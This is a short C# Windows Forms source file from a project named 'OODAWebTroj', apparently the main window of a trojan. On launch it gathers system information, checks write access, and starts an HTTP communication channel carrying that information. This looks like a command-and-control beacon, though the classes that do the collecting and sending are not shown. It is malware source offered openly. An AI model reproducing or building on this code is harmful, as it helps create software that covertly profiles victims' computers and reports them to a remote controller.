using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Management;
using System.Text;
using System.Windows.Forms;

namespace OODAWebTroj
{
    public partial class MainFrame : Form
    {
        private Observer.SystemInfo _s;
        private Observer.Writable _w;
        public MainFrame()
        {
            InitializeComponent();
            Observe();
        }

        private void Observe()
        {
            _s = new Observer.SystemInfo();
            _w = new Observer.Writable();
            if(!_w.Writeable) Close();
            Comm.Start(_s,Comm.CommType.Http);
        }
    }
}
